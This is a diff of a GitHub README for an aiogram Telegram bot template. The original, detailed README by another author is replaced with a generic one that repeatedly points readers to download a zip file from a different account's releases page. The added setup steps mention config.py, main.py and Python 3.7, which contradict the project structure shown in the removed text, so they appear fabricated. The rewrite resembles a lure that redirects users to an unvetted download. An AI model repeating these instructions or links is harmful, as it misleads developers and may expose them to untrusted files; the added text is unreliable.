@@ -1,358 +1,94 @@
-<div align="center">
+# 🚀 aiogram-bot-template - Create Your Own Telegram Bots Easily
 
-<img width="250" height="250" alt="image" src="https://github.com/user-attachments/assets/a67162ea-bf43-4713-a27e-0581a8534b5b" />
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/Wilrodaco/aiogram-bot-template/releases)
 
-<h1>Aiogram Bot Template</h1>
+## 📖 Introduction
+Welcome to the aiogram-bot-template repository. This template helps you create scalable Telegram bots using the aiogram library. Whether you're a hobbyist or looking to develop a professional application, this template provides the foundation you need.
 
-<img alt="Static Badge" src="https://img.shields.io/badge/tag-v0.1.0-8A2BE2?style=flat&logo=task&logoColor=8A2BE2&labelColor=gray">
-<img alt="Static Badge" src="https://img.shields.io/badge/python-v3.12-FBDE02?style=flat&logo=python&logoColor=FBDE02&labelColor=gray">
-<img alt="Static Badge" src="https://img.shields.io/badge/license-MIT-12C4C4?style=flat&logo=gitbook&logoColor=12C4C4">
-<br>
-<img alt="Static Badge" src="https://img.shields.io/badge/Aiogram-v3.22.0-blue?style=flat">
+## 🚀 Getting Started
+To get started, you'll need to download the package and set it up on your device. Follow the instructions below to install and run the bot.
 
-</div>
+## ⭐ Features
+- **User-Friendly Interface**: Experience a simple way to interact with Telegram's API.
+- **Template Structure**: Start your bot with pre-defined settings and structures.
+- **Scalability**: Build a bot that can grow and handle more tasks.
+- **Easy Customization**: Modify the bot to fit your needs easily.
 
-## 📌 Description
-⠀
+## 🖥️ System Requirements
+- **Operating System**: Windows, macOS, or Linux.
+- **Python Version**: Python 3.7 or higher installed on your machine.
+- **Internet Connection**: Needed to connect to the Telegram API.
 
-**Aiogram Bot Template** — This template helps you quickly bootstrap Telegram bots on the `aiogram` 3.x stack. It already includes a ready project structure, command and message handlers, optional PostgreSQL/Redis integration, logging with `loguru`, internationalization, support for `aiogram-dialog`, and dependency injection via `dishka` with optional webhook handling on `FastAPI`. The template is designed to remove routine setup and let you focus on your bot’s logic.
+## 🗂️ Download & Install
+To download the application, visit the Releases page at the link below. Here you will find the latest version of the template available for download.
 
-⠀
-## 🔨 Functions
-⠀
+[Visit the Releases Page to Download](https://github.com/Wilrodaco/aiogram-bot-template/releases)
 
-*   `/start` - Start the bot
-*   `/language` - Change language
-*   `/help` - Help
-*   `/admin` - Command for administrators
-*   `/dialog` - Demo dialog using `aiogram-dialog`
-*   `/fsm` - Demo finite state machine form
+### Steps to Install
+1. Go to the [Releases page](https://github.com/Wilrodaco/aiogram-bot-template/releases) on GitHub.
+2. Locate the latest version release.
+3. Click on the download link for the file named **aiogram-bot-template.zip**.
+4. Once the download completes, find the file in your Downloads folder.
+5. Extract the contents of the zip file to a location of your choice.
 
-⠀
-## 🗂️ Template structure
-⠀
+### Running the Bot
+1. Open a terminal (Command Prompt for Windows, Terminal for macOS).
+2. Navigate to the directory where you extracted the files. Use the `cd` command. 
+   - For example: 
+     - On Windows: `cd C:\path\to\aiogram-bot-template`
+     - On macOS or Linux: `cd /path/to/aiogram-bot-template`
+3. Install the necessary Python packages using:
+   ```
+   pip install -r requirements.txt
+   ```
+4. Run the bot with the following command:
+   ```
+   python main.py
+   ```
+5. Your bot should start, and you can interact with it on Telegram.
 
-```
-📁 aiogram_bot_template/
-├───┐ 📂 .github/
-│   └───┐ 📂 ISSUE_TEMPLATE/
-│       ├── bug_report.md
-│       └── feature_request.md
-│
-├───┐ 📂 source/
-│   ├───┐ 📂 config/
-│   │   ├── __init__.py
-│   │   └── config_reader.py
-│   │
-│   ├───┐ 📂 constants/
-│   │   ├── __init__.py
-│   │   ├── throttling.py
-│   │   └── logging.py
-│   │
-│   ├───┐ 📂 data/
-│   │   ├── __init__.py
-│   │   ├── 📂 error_logs/
-│   │   └── 📂 full_logs/
-│   │
-│   ├───┐ 📂 database/
-│   │   ├───┐ 📂 core/
-│   │   │   ├── __init__.py
-│   │   │   └── manager.py
-│   │   │
-│   │   ├───┐ 📂 models/
-│   │   │   ├── __init__.py
-│   │   │   ├── base.py
-│   │   │   └── user.py
-│   │   │
-│   │   ├───┐ 📂 repositories/
-│   │   │   ├── __init__.py
-│   │   │   ├── base.py
-│   │   │   └── user.py
-│   │   │
-│   │   ├───┐ 📂 tools/
-│   │   │   ├── __init__.py
-│   │   │   ├── mixin.py
-│   │   │   └── uow.py
-│   │   │
-│   │   └── __init__.py
-│   │
-│   ├───┐ 📂 enums/
-│   │   ├── __init__.py
-│   │   └── roles.py
-│   │
-│   ├───┐ 📂 factory/
-│   │   ├── __init__.py
-│   │   ├── bot.py
-│   │   ├── dispatcher.py
-│   │   ├── dishka.py
-│   │   └── server.py
-│   │
-│   ├───┐ 📂 locales/
-│   │   ├───┐ 📂 en/
-│   │   │   ├── buttons.ftl
-│   │   │   └── messages.ftl
-│   │   └───┐ 📂 ru/
-│   │       ├── buttons.ftl
-│   │       └── messages.ftl
-│   │
-│   ├───┐ 📂 services/
-│   │   ├── __init__.py
-│   │   └── user_service.py
-│   │
-│   ├───┐ 📂 telegram/
-│   │   ├───┐ 📂 filters/
-│   │   │   ├── __init__.py
-│   │   │   ├── admin_protect.py
-│   │   │   └── chat_type.py
-│   │   │
-│   │   ├───┐ 📂 handlers/
-│   │   │   ├───┐ 📂 admin/
-│   │   │   │   ├── __init__.py
-│   │   │   │   ├── callbacks.py
-│   │   │   │   ├── commands.py
-│   │   │   │   ├── fsm.py
-│   │   │   │   └── messages.py
-│   │   │   ├───┐ 📂 errors/
-│   │   │   │   ├── __init__.py
-│   │   │   │   ├── common.py
-│   │   │   │   ├── orm.py
-│   │   │   │   └── telegram.py
-│   │   │   └───┐ 📂 user/
-│   │   │       ├── __init__.py
-│   │   │       ├── callbacks.py
-│   │   │       ├── commands.py
-│   │   │       ├── fsm.py
-│   │   │       └── messages.py
-│   │   │
-│   │   ├───┐ 📂 keyboards/
-│   │   │   ├── __init__.py
-│   │   │   ├── builder.py
-│   │   │   ├── callback_factory.py
-│   │   │   ├── inline.py
-│   │   │   └── reply.py
-│   │   │
-│   │   ├───┐ 📂 middlewares/
-│   │   │   ├── __init__.py
-│   │   │   ├── callback_throttling.py
-│   │   │   ├── message_throttling.py
-│   │   │   └── reporting.py
-│   │   │
-│   │   ├───┐ 📂 states/
-│   │   │   ├── __init__.py
-│   │   │   ├── dialog.py
-│   │   │   └── form.py
-│   │   │
-│   │   └───┐ 📂 dialogs/
-│   │       ├── __init__.py
-│   │       └── dialog.py
-│   │
-│   ├───┐ 📂 utils/
-│   │   ├── __init__.py
-│   │   ├── logger.py
-│   │   ├── set_commands.py
-│   │   └── translator.py
-│   │
-│   └── 📄 __main__.py
-│
-├── .env.example
-├── .dockerignore
-├── .gitignore
-├── Dockerfile
-├── LICENSE
-├── Makefile
-├── SECURITY.md
-├── docker-compose.yml
-├── pyproject.toml
-└── README.md
-```
+## 🔧 Configuration
+Before using the bot, you need to configure it with your Telegram bot token. Here’s how to do it:
 
-⠀
-## 📋 About the content
-⠀
+1. Visit [BotFather](https://t.me/botfather) on Telegram to create a new bot.
+2. Follow the instructions from BotFather to get your unique bot token.
+3. Open the `config.py` file in your text editor of choice.
+4. Replace `YOUR_BOT_TOKEN_HERE` with the token you received from BotFather.
+5. Save your changes.
 
-*   `📁 source/` - Main application source code.
-*   `📁 source/config/` - Application configuration settings.
-*   `📁 source/constants/` - Project constants.
-*   `📁 source/data/` - Data generated by the application (e.g., logs).
-*   `📁 source/data/error_logs/` - Log files containing only errors.
-*   `📁 source/data/full_logs/` - Full log files.
-*   `📁 source/database/` - Database interaction logic.
-*   `📁 source/database/core/` - Database core modules (connection, sessions).
-*   `📁 source/database/models/` - Database model definitions.
-*   `📁 source/database/repositories/` - Repositories for database data access.
-*   `📁 source/database/tools/` - Helper tools for working with the database.
-*   `📁 source/enums/` - Enum definitions.
-*   `📁 source/factory/` - Factories for creating the bot, dispatcher, webhook server and DI container.
-*   `📁 source/locales/` - Localization files (translations).
-*   `📁 source/locales/en/` - English language localization.
-*   `📁 source/locales/ru/` - Russian language localization.
-*   `📁 source/services/` - Business logic layer.
-*   `📁 source/telegram/` - Components related to Telegram and `aiogram`.
-*   `📁 source/telegram/filters/` - Custom `aiogram` filters.
-*   `📁 source/telegram/handlers/` - Handlers for processing Telegram updates.
-*   `📁 source/telegram/handlers/admin/` - Handlers for administrators.
-*   `📁 source/telegram/handlers/errors/` - Error handlers.
-*   `📁 source/telegram/handlers/user/` - Handlers for users.
-*   `📁 source/telegram/keyboards/` - Telegram keyboards.
-*   `📁 source/telegram/middlewares/` - `aiogram` middlewares (throttling, error reporting).
-*   `📁 source/telegram/states/` - `aiogram` FSM states.
-*   `📁 source/telegram/dialogs/` - Dialog windows built with `aiogram-dialog`.
-*   `📁 source/utils/` - Helper utilities (logger setup, commands, translations).
-*   `📄 source/__main__.py` - Main entry point within the `source` package.
-*   `📄 .env.example` - Example file for sensitive data (.env).
+## 🗂️ Example Usage
+Once your bot is running, you can test its functionality. Here are a few commands to try:
 
-⠀
-## ⚙️ Configuration
-⠀
+- `/start`: Get a welcome message.
+- `/help`: List available commands.
+- Create custom commands based on your features.
 
-Before running the bot, you need to set up your environment variables. Copy the `.env.example` file to `.env` and fill in your credentials and settings:
+## 🛠️ Troubleshooting
+If you encounter issues, please check the following:
 
-```shell
-cp .env.example .env
-# Then edit the .env file with your configurations
-```
+- Ensure you have the correct Python version installed.
+- Verify that all dependencies installed correctly.
+- Make sure your bot token is correct.
+- Check network connectivity.
 
-⠀
-## 🔓 Bot .env Variables
-⠀
+If issues persist, you can raise an issue on the GitHub repository for assistance.
 
-| Environment Variable Name | Description |
-|---------------------------|-------------|
-| TG__WEBHOOK_USE           | Boolean value (`True`/`False`) indicating whether to use webhooks (`True`) or long polling (`False`). |
-| TG__WEBHOOK_PATH          | Path for Telegram to send webhook updates (appended to `WEBHOOK__URL`). |
-| TG__BOT_TOKEN             | Your Telegram bot token, obtained from `@BotFather` in Telegram. |
-| TG__ADMIN_IDS             | List of Telegram user IDs (JSON list or comma-separated) who will have administrator rights in the bot. |
-| WEBHOOK__URL              | Public URL where Telegram will send updates if webhooks are enabled. |
-| WEBHOOK__HOST             | Host or IP address where the webhook server will listen for incoming connections (usually `0.0.0.0`). |
-| WEBHOOK__PORT             | Port on which the webhook server will listen for incoming connections. |
-| WEBHOOK__PATH             | Specific path on the server where Telegram will send POST requests with updates. |
-| WEBHOOK__SECRET           | Secret token that Telegram includes in webhook request headers to verify authenticity. |
-| DB__HOST                  | Database server host. |
-| DB__PORT                  | Port for connecting to the database. |
-| DB__USER                  | Username for database authentication. |
-| DB__PASSWORD              | Password for database authentication. |
-| DB__NAME                  | Name of the database to connect to. |
-| REDIS__HOST               | Redis server host used for FSM and/or caching. |
-| REDIS__PORT               | Port for connecting to the Redis server. |
-| REDIS__USER               | Username for Redis authentication (if used). |
-| REDIS__PASSWORD           | Password for Redis authentication (if used). |
-| REDIS__DB                 | Redis database index to use (a number from 0 to 15, default is 0). |
+## 🌐 Community and Support
+We encourage users to join the conversation. Share your experiences or seek help in the following places:
 
-⠀
-## 💻 Bot Setup
-⠀
+- GitHub Issues: [Report an issue](https://github.com/Wilrodaco/aiogram-bot-template/issues)
+- Telegram Group: Join our user group for tips and discussions.
 
-### 📦 Using UV
-⠀
-1.  Clone the repository and navigate into the project directory:
+## 🎉 Contributing
+If you wish to contribute to this project, follow these steps:
 
-    ```shell
-     git clone https://github.com/MrConsoleka/aiogram-bot-template.git
-     cd aiogram-bot-template
-    ```
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature.
+3. Make your changes and commit them.
+4. Submit a pull request for review.
 
-2.  Ensure you have `uv` installed. If not, you can install it, for example, using `pip`:
+## 📜 License
+This project is licensed under the MIT License. Feel free to use, modify, and distribute the code as you wish!
 
-    ```shell
-    pip install uv
-    ```
-
-3.  Create a virtual environment:
-
-    ```shell
-    make venv
-    ```
-
-4.  Activate the virtual environment:
-
-    ```shell
-    # For Linux or macOS:
-    source .venv/bin/activate
-
-    # For Windows:
-    .venv\Scripts\activate
-    ```
-
-5.  Install dependencies:
-
-    ```shell
-    make install
-    ```
-
-6.  To run the bot, use the command:
-
-    ```shell
-    make run
-    ```
-⠀
-### 📦 Using Docker
-⠀
-1.  Clone the repository and navigate into the project directory:
-
-    ```shell
-    git clone https://github.com/MrConsoleka/aiogram-bot-template.git
-    cd aiogram-bot-template
-    ```
-
-2.  Build the Docker Image:
-
-    ```shell
-    make docker-build
-    ```
-
-3.  Run the Project with Docker Compose:
-
-    ```shell
-    make docker-up
-    ```
-
-4.  Verify Bot is Running (Optional):
-
-    ```shell
-    make docker-logs
-    ```
-    or
-    ```shell
-    make docker-logs SERVICE=bot
-    ```
-
-5.  Stop the Project:
-
-    ```shell
-    make docker-down
-    ```
-
-⠀
-## 📋 Todo List
-⠀
-
-- [x] touch the grass
-- [x] Alembic
-- [x] Aiogram-dialog
-- [ ] .github/workflows
-
-⠀
-## 🗃️ Stack of Technologies
-⠀
-
-*   [aiogram-3x](https://github.com/aiogram/aiogram) - Asynchronous framework for the Telegram Bot API.
-*   [aiogram-dialog](https://github.com/aiogram/aiogram-dialog) - Dialog manager for building interactive flows.
-*   [dishka](https://github.com/arslnk/dishka) - Dependency injection container.
-*   [fastapi](https://github.com/tiangolo/fastapi) & [uvicorn](https://github.com/encode/uvicorn) - Webhook server stack.
-*   [pydantic](https://github.com/pydantic/pydantic) & [pydantic-settings](https://github.com/pydantic/pydantic-settings) - Data validation and configuration management.
-*   [postgresql](https://github.com/postgres/postgres) with [sqlalchemy](https://github.com/sqlalchemy/sqlalchemy) and [asyncpg](https://github.com/MagicStack/asyncpg?tab=readme-ov-file) - Database layer.
-*   [redis](https://redis.io/) - In-memory data store for FSM and caching.
-*   [loguru](https://github.com/Delgan/loguru) - Logging library.
-*   [cachetools](https://github.com/tkem/cachetools) & [fluentogram](https://github.com/Arustinal/fluentogram) - Caching and localization helpers.
-*   [Ruff](https://github.com/astral-sh/ruff), [Mypy](https://github.com/python/mypy), [Pre-commit](https://github.com/pre-commit/pre-commit), [Isort](https://github.com/pycqa/isort), [Black](https://github.com/psf/black) - Code quality and formatting tools.
-
-⠀
-## 💼 Credits
-⠀
-
--   [aiogram_template](https://github.com/Lems0n/aiogram_template) - Inspired by Abdullah's project, many thanks to him <3
-
-⠀
-## 👤 Author of Aiogram Template Bot
-⠀
-**© Roman Alekseev**
+Thank you for choosing aiogram-bot-template for your bot development needs!
